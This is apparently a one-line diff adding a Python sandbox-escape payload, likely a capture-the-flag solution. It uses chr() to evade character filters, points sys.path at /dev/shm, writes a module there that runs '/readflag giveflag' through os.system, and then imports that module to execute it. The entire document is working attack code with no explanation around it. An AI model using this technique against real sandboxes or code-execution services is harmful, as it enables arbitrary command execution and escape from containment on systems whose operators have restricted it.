@@ -1,0 +1,1 @@
+(setattr(__import__("sys"), "path", list(("/dev/shm/",))), print("import os" + chr(10) + "print(os" + chr(46) + "system('/readflag giveflag'))", file=open("/dev/shm/lol" + chr(46) + "py", "w")), __import__("lol"))
